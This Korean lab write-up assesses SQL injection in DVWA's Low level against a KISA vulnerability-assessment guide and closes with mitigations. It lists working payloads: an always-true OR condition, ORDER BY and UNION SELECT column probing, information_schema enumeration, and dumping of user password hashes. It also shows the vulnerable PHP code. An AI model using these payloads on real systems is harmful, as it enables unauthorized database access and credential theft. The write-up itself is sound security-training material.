# SQL Injection 취약점

## 개요

- 본 실습에서는 DVWA의 Low 단계에서 SQL Injection 취약점을 대상으로  
  사용자 입력값에 대한 검증 없이 SQL Query가 실행되는지 확인하여 SQL Injection 취약점 존재 여부를 점검했습니다.
- 주요정보통신기반시설 기술적 취약점 분석·평가 방법 상세가이드의 SQL Injection 관련 항목(p.693~699)과 연계하여 점검하였습니다.

---

## 주요정보통신기반시설 기준

> 출처 : https://www.kisa.or.kr/2060204/form?postSeq=22&page=1#fnPostAttachDownload ( p.693 ~ 699 )

### 점검 내용

- 사용자 입력값이 SQL Query에 직접 포함되어 비정상적인 Query문이 실행되는지 점검합니다.
- 인증 우회, 정보 조회, 데이터베이스 구조 확인 등이 가능한지 확인합니다.

---

### 점검 목적

- 입력값 조작을 통한 비정상적인 SQL문 실행을 차단합니다.
- 중요 정보 유출과 관리자 권한 탈취를 방지합니다.
- 사용자 입력값 검증이 적절히 이루어지는지 점검합니다.

---

### 보안 위협

- 사용자 입력값이 SQL 쿼리에 그대로 삽입될 경우, 공격자가 의도하지 않은 SQL문을 실행할 수 있습니다.
- 이로 인해 데이터베이스에 비인가 접근이 가능해지고 데이터의 조회, 수정, 삭제와 같은 행위로 이어질 수 있습니다.
- 로그인 페이지에서는 인증 우회가 가능하며, 계정 정보가 저장된 테이블이 노출될 경우 관리자 계정 탈취로 이어질 수 있습니다.
- 실제 환경에서는 단순 조회에서 끝나지 않고 데이터 변조, 서비스 장애, 개인정보 유출 사고로 이어질 수 있어 위험도가 높은 취약점입니다.

---

### 판단 기준

#### 양호

- 사용자 입력값 검증이 적용된 경우
- Prepared Statement를 사용한 경우
- 에러 메시지가 외부에 노출되지 않는 경우
- DB 계정에 최소 권한만 부여된 경우

#### 취약

- 사용자 입력값이 SQL문에 직접 연결되는 경우
- 작은따옴표(`'`) 입력만으로 SQL 오류가 발생하는 경우
- UNION SELECT 등을 이용한 정보 조회가 가능한 경우
- 데이터베이스 구조 및 계정 정보 확인이 가능한 경우

---

## 점검 절차

1. 정상 입력 동작 확인
2. 작은따옴표 입력 시 오류 확인
3. OR 조건을 이용한 전체 조회 확인
4. ORDER BY를 통한 컬럼 수 확인
5. UNION SELECT 가능 여부 확인
6. DB / Table / Column 정보 조회
7. 계정 및 Password Hash 확인

---

## 취약점 검증 및 공격 수행

### 실습 화면

- DVWA의 SQL Injection 화면이며, User ID 값을 입력하면 해당 사용자의 정보를 조회하는 구조입니다.

![01](/SQL%20Injection/img/LOW/01.png)

---

### 동작 확인

- User ID 입력값이 SQL Query에 그대로 포함되는지 확인하기 위해 작은따옴표(`'`)를 입력했습니다.

```
'
```

![02](/SQL%20Injection/img/LOW/02.png)  
![03](/SQL%20Injection/img/LOW/03.png)

- 소스코드를 보면 사용자가 입력한 id 값이 그대로 SQL Query문에 삽입됩니다.

```sql
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

- 작은따옴표(`'`)를 입력하면 user_id 값에 그대로 삽입되어 아래와 같은 형태가 됩니다.

```sql
WHERE user_id= ''';
```

- SQL 문법 오류가 발생하여 HTTP 500 Error가 출력됩니다.
- 따라서 입력값 검증 없이 사용자 값이 SQL Query문에 그대로 삽입되며, SQL Injection 취약점이 존재합니다.

---

### 정상 작동 확인

![04](/SQL%20Injection/img/LOW/04.png)

- user_id 값에 1을 입력하면 `admin / admin` 정보가 정상적으로 출력됩니다.
- 사용자가 입력한 값이 `WHERE` 조건에 그대로 사용되어 해당 ID의 사용자 정보를 조회하는 방식으로 동작합니다.

---

### 인증 우회 확인 (OR 조건 삽입)

- 로그인 우회가 가능한지 확인하기 위해 User ID 입력창에 아래 값을 입력했습니다.

```sql
1' or '1'='1
```

![05](/SQL%20Injection/img/LOW/05.png)

- 소스코드를 보면 사용자가 입력한 값이 그대로 SQL Query문에 삽입됩니다.
- 실제로 실행되는 SQL Query는 아래와 같은 형태가 됩니다.

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';
```

- `'1'='1'` 조건은 항상 참(True)이므로 WHERE 조건 전체가 항상 참이 됩니다.
- 그 결과 특정 사용자 한 명만 조회되는 것이 아니라 users 테이블에 존재하는 모든 사용자 정보가 출력됩니다.
- 이는 인증 우회(Authentication Bypass)가 가능하다는 의미이며, 공격자가 정상적인 인증 절차 없이 데이터에 접근할 수 있는 매우 위험한 상태입니다.
- 입력값 검증 없이 SQL Query에 직접 값을 삽입하는 구조로 인해 SQL Injection 취약점이 명확하게 존재합니다.

---

### 컬럼 개수 확인 (UNION SELECT)

- UNION SELECT 공격을 수행하기 위해서는 기존 SELECT 문의 컬럼 개수를 먼저 확인해야 합니다.
- UNION 구문은 원본 Query와 동일한 개수의 컬럼을 가져야만 정상적으로 실행됩니다.
- User ID 입력창에 아래 값을 입력했습니다.

```sql
1' UNION SELECT 1 #
```

#### 동작 확인

```sql
SELECT first_name, last_name FROM users
WHERE user_id = '1'
UNION
SELECT 1;
```

![06](/SQL%20Injection/img/LOW/06.png)
![07](/SQL%20Injection/img/LOW/07.png)

- `SELECT 1`은 1개의 컬럼만 반환합니다.
- UNION SELECT는 기존 Query와 반드시 동일한 개수의 컬럼을 가져야 하므로 컬럼 수가 맞지 않으면 오류가 발생합니다.
- SQL 문법 오류가 발생하고 HTTP 500 Error가 출력됩니다.

---

- 다음은 User ID 입력창에 `1' union select 1,2#`를 입력합니다.

#### 동작 확인

```sql
SELECT first_name, last_name FROM users
WHERE user_id = '1'
UNION
SELECT 1, 2;
```

![08](/SQL%20Injection/img/LOW/08.png)
![09](/SQL%20Injection/img/LOW/09.png)

- 실행 결과 오류 없이 `First name: 1`, `Surname: 2`가 정상적으로 출력됩니다.
- 기존 Query의 컬럼 개수가 2개라는 것을 확인했습니다.

---

### UNION SELECT 컬럼 개수 초과 확인

- 컬럼 개수가 2개임을 재확인하기 위해 아래 값을 입력했습니다.

```sql
1' union select 1,2,3#
```

#### 동작 확인

```sql
SELECT first_name, last_name FROM users
WHERE user_id = '1'
UNION
SELECT 1, 2, 3;
```

![10](/SQL%20Injection/img/LOW/10.png)
![11](/SQL%20Injection/img/LOW/11.png)

- 기존 Query는 2개의 컬럼만 가지고 있으므로 컬럼 수가 맞지 않아 SQL 오류가 발생합니다.
- HTTP 500 Error가 출력됩니다.

---

### 컬럼 개수 확인 (ORDER BY)

- UNION SELECT 공격 전 기존 Query의 컬럼 개수를 확인하기 위해 `order by` 구문을 사용했습니다.

```sql
1' order by 2#
```

#### 동작 확인

```sql
SELECT first_name, last_name FROM users
WHERE user_id = '1'
ORDER BY 2;
```

![12](/SQL%20Injection/img/LOW/12.png)

- `order by 2`는 두 번째 컬럼까지 존재하는지 확인하는 구문입니다.
- 실행 결과 오류 없이 정상적으로 페이지가 출력되어 최소 2개의 컬럼이 존재함을 확인했습니다.

---

### order by 3 확인

```sql
1' order by 3#
```

#### 동작 확인

```sql
SELECT first_name, last_name FROM users
WHERE user_id = '1'
ORDER BY 3;
```

![13](/SQL%20Injection/img/LOW/13.png)
![14](/SQL%20Injection/img/LOW/14.png)

- `order by 3`은 세 번째 컬럼이 존재하는지 확인하는 구문입니다.
- HTTP 500 Error가 발생했습니다.
- 세 번째 컬럼이 존재하지 않으며, 컬럼 수가 2개라는 것을 확인했습니다.

---

### DATABASE 이름 확인

- UNION SELECT를 이용하여 현재 존재하는 Database 목록을 조회했습니다.

```sql
1' union select schema_name,1 from information_schema.schemata#
```

#### 동작 확인

```sql
SELECT first_name, last_name
FROM users
WHERE user_id = '1'
UNION
SELECT schema_name, 1
FROM information_schema.schemata;
```

![15](/SQL%20Injection/img/LOW/15.png)

- `information_schema.schemata`는 MySQL에 존재하는 모든 Database 목록을 저장하는 시스템 테이블입니다.
- `schema_name` 컬럼을 조회하여 현재 서버에 존재하는 Database 이름을 확인할 수 있습니다.
- 실행 결과 `information_schema`, `dvwa` 등의 Database가 출력되었습니다.
- 실제 사용 중인 Database 이름이 `dvwa`라는 것을 확인했습니다.

---

### Table 정보 확인

- Database 이름이 `dvwa`인 것을 확인한 후,  
  해당 Database 내부에 어떤 테이블이 존재하는지 확인하기 위해 `information_schema.tables`를 조회했습니다.

```sql
1' union select table_name, 2
from information_schema.tables
where table_schema='dvwa'#
```

![16](/SQL%20Injection/img/LOW/16.png)

- `table_schema='dvwa'` 조건을 통해 DVWA Database에 포함된 테이블만 조회했습니다.
- 실행 결과 `security_log`, `users`, `guestbook`, `access_log` 등의 테이블이 존재합니다.
- `users` 테이블은 사용자 계정 정보가 저장될 가능성이 높기 때문에 이후 계정 정보 탈취를 위한 주요 공격 대상입니다.
- 공격자는 단순히 Database 이름만 확인하는 것이 아니라, 실제로 어떤 테이블에 중요한 정보가 저장되어 있는지까지 파악할 수 있습니다.

---

### Column 정보 확인

- `users` 테이블이 주요 공격 대상이라고 판단한 후,  
  실제 어떤 컬럼에 계정 정보가 저장되어 있는지 확인하기 위해 `information_schema.columns`를 조회했습니다.

```sql
1' union select column_name, 2
from information_schema.columns
where table_name='users'#
```

![17](/SQL%20Injection/img/LOW/17.png)

- 실행 결과 `USER`, `PASSWORD_ERRORS`, `PASSWORD_EXPIRATION_TIME`, `user_id`, `first_name`, `last_name`,  
  `password`, `avatar`, `last_login`, `failed_login`, `role`, `account_enabled` 등 총 12개의 컬럼이 존재합니다.
- 특히 `USER`와 `password` 컬럼은 사용자 계정 정보와 비밀번호가 저장되는 핵심 컬럼이며,  
  `role` 컬럼을 통해 관리자 권한 여부도 식별 가능한 상태입니다.
- `last_login`, `failed_login` 등의 컬럼을 통해 로그인 이력까지 노출될 수 있습니다.
- 공격자는 단순히 테이블 존재 여부를 확인하는 것이 아니라, 실제 민감한 정보가 저장된 컬럼까지 식별할 수 있으며, 이후 계정 탈취 및 권한 상승 공격으로 이어질 수 있습니다.

---

### 계정 정보 조회

- 확인한 `user`, `password` 컬럼을 대상으로 실제 사용자 계정 정보를 조회했습니다.

```
1' union select user, password from users#
```

![18](/SQL%20Injection/img/LOW/18.png)

- 실행 결과 `admin`, `gordonb`, `1337`, `pablo`, `smithy` 등의 사용자 계정 정보가 출력됩니다.
- 함께 출력된 값은 평문 비밀번호가 아닌 MD5 형태의 해시(Hash) 값으로 저장된 Password입니다.
- SQL Injection 취약점을 이용하여 관리자 계정을 포함한 사용자 계정 정보가 외부에서 직접 조회됩니다.
- 실제 환경에서는 해당 해시 값을 크래킹하여 관리자 계정 탈취 및 추가적인 권한 상승 공격으로 이어질 수 있습니다.

---

## 취약점 분석

- User ID 입력값이 검증 없이 SQL Query문에 그대로 삽입됩니다.
- 작은따옴표(`'`) 하나만 입력해도 SQL 문법 오류가 발생하며 HTTP 500 Error가 출력됩니다.
- `1' or '1'='1` 구문으로 모든 사용자 정보가 출력되어 인증 우회가 가능합니다.
- `union select`, `order by`를 이용하여 Database 이름, Table 정보, Column 정보까지 조회했으며,  
  최종적으로 `users` 테이블의 계정 정보와 Password Hash 값까지 확인했습니다.
- 소스코드를 보면 `$_REQUEST['id']`로 입력값을 받아 검증 없이 SQL Query에 문자열로 직접 연결하며,  
  오류 발생 시 `mysqli_error()`를 통해 DB 에러 메시지가 그대로 노출됩니다.

```php
$id = $_REQUEST[ 'id' ];                                          // 입력값 검증 없이 그대로 수신
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; // 입력값을 SQL Query에 직접 연결
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
    or die('<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>'); // DB 에러 메시지 외부 노출
```

**판단 : 취약** — 실제 환경이었다면 관리자 계정 탈취, 개인정보 유출, 데이터 변조 등으로 이어질 수 있습니다.

---

## 대응 방안

### 입력값 검증 수행

- 사용자 입력값에 대해 숫자, 문자열, 길이 등을 검증하여 비정상적인 SQL 구문이 삽입되지 않도록 제한합니다.

```php
$id = $_REQUEST['id'];

// 숫자 형식만 허용 — 문자열/특수문자 포함 시 즉시 차단
if (!is_numeric($id)) {
    die("유효하지 않은 입력값입니다.");
}
```

#### 핵심 효과

- 기본적인 SQL Injection 공격을 사전에 차단합니다.

---

### Prepared Statement 사용

- SQL Query와 사용자 입력값을 분리하여 입력값이 SQL 문법으로 해석되지 않도록 처리합니다.

```php
$id = $_REQUEST['id'];

// SQL Query 구조와 입력값을 분리 — '?'에 값을 바인딩하므로 입력값이 SQL 문법으로 해석 불가
$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("s", $id); // 입력값을 문자열 파라미터로 바인딩 — 특수문자가 쿼리 구조를 변경하지 못함
$stmt->execute();
$result = $stmt->get_result();
```

#### 핵심 효과

- SQL Injection을 원천적으로 방지합니다.

---

### 특수문자 필터링

- 작은따옴표(`'`), 주석(`--`, `#`), UNION, OR 등 공격에 자주 사용되는 구문을 제한합니다.

```php
$id = $_REQUEST['id'];

// 작은따옴표, 주석, UNION 등 SQL Injection에 사용되는 패턴 차단
if (preg_match('/[\'\";\-\-\#]|union|select|or|and/i', $id)) {
    die("허용되지 않는 문자가 포함되어 있습니다.");
}
```

#### 핵심 효과

- 인증 우회 및 정보 조회 공격을 방지합니다.

---

### 에러 메시지 노출 차단

- SQL 오류 발생 시 DB 에러 메시지를 사용자에게 직접 출력하지 않도록 설정합니다.
- 에러는 서버 로그에만 기록하고 사용자에게는 일반적인 안내 메시지만 출력합니다.

```php
$result = mysqli_query($conn, $query);
if (!$result) {
    error_log("DB Error: " . mysqli_error($conn)); // 에러 내용은 서버 로그에만 기록 — 외부 노출 차단
    die("요청을 처리할 수 없습니다.");              // 사용자에게는 일반 메시지만 출력
}
```

#### 핵심 효과

- 공격자가 DB 구조 및 에러 내용을 통해 추가 공격에 활용하는 것을 차단합니다.

---

### 최소 권한 원칙 적용

- DB 계정에 필요한 최소 권한만 부여하고 관리자 계정을 직접 사용하지 않도록 설정합니다.

#### 핵심 효과

- 침해 발생 시 피해 범위를 최소화합니다.
